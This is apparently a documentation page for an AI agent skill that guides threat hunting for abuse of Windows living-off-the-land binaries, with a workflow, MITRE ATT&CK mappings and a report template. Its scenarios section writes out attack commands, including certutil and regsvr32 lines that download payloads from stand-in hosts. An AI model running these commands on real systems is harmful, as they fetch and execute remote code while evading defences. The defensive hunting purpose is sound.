---
title: "Hunting For Living Off The Land Binaries"
sidebar_label: "Hunting For Living Off The Land Binaries"
description: "Proactively hunt for adversary abuse of legitimate system binaries (LOLBins) to execute malicious payloads while evading detection"
---

{/* This page is auto-generated from the skill's SKILL.md by website/scripts/generate-skill-docs.py. Edit the source SKILL.md, not this page. */}

# Hunting For Living Off The Land Binaries

Proactively hunt for adversary abuse of legitimate system binaries (LOLBins) to execute malicious payloads while evading detection.

## Skill metadata

| | |
|---|---|
| Source | Optional — install with `xavani skills install official/cybersecurity/hunting-for-living-off-the-land-binaries` |
| Path | `optional-skills/cybersecurity/threat-hunting/hunting-for-living-off-the-land-binaries` |
| Platforms | all |

## Reference: full SKILL.md

:::info
The following is the complete skill definition that Xavani loads when this skill is triggered. This is what the agent sees as instructions when the skill is active.
:::

# Hunting for Living-off-the-Land Binaries (LOLBins)

## When to Use

- When investigating fileless malware campaigns that bypass traditional AV
- During proactive threat hunts targeting defense evasion techniques
- When EDR alerts fire on legitimate binaries executing unusual child processes
- After threat intelligence reports indicate LOLBin abuse in active campaigns
- During red team/purple team exercises validating detection coverage for T1218

## Prerequisites

- Access to EDR telemetry (CrowdStrike, Microsoft Defender for Endpoint, SentinelOne)
- SIEM with process creation logs (Sysmon Event ID 1, Windows Security 4688)
- Familiarity with LOLBAS Project (lolbas-project.github.io) reference list
- PowerShell command-line logging enabled (Module Logging, Script Block Logging)
- Network proxy or firewall logs for correlating outbound connections

## Workflow

1. **Define Hunt Hypothesis**: Formulate a hypothesis based on threat intel (e.g., "Adversaries are using certutil.exe to download second-stage payloads from external domains").
2. **Identify Target LOLBins**: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).
3. **Collect Process Telemetry**: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.
4. **Baseline Normal Behavior**: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.
5. **Identify Anomalies**: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.
6. **Correlate and Enrich**: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.
7. **Document and Report**: Record findings, update detection rules, and create IOC lists for identified malicious LOLBin usage.

## Key Concepts

| Concept | Description |
|---------|-------------|
| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.002 | Control Panel (control.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 |
| T1218.011 | Rundll32 |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| Proxy Execution | Using trusted binaries to execute untrusted code |
| Fileless Attack | Attack that operates primarily in memory without dropping files |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CrowdStrike Falcon | EDR telemetry and process tree analysis |
| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
| Splunk | SIEM log aggregation and SPL queries |
| Elastic Security | Detection rules and timeline investigation |
| Sysmon | Detailed process creation and network logging |
| LOLBAS Project | Reference database of LOLBin capabilities |
| Sigma Rules | Generic detection rule format for LOLBins |
| Velociraptor | Endpoint forensic collection and hunting |

## Common Scenarios

1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Hypothesis: [Stated hypothesis]
LOLBins Investigated: [List of binaries]
Time Range: [Start] - [End]
Data Sources: [EDR, Sysmon, SIEM]
Findings:
  - [Finding 1 with evidence]
  - [Finding 2 with evidence]
Anomalies Detected: [Count]
True Positives: [Count]
False Positives: [Count]
IOCs Identified: [List]
Detection Rules Created/Updated: [List]
Recommendations: [Next steps]
```

## Standards mapping

- **d3fend_techniques**: Executable Denylisting, Execution Isolation, File Metadata Consistency Validation, Application Protocol Command Analysis, Content Format Conversion
- **nist_csf**: DE.CM-01, DE.AE-02, DE.AE-07, ID.RA-05
- **license**: Apache-2.0
- **author**: mahipal
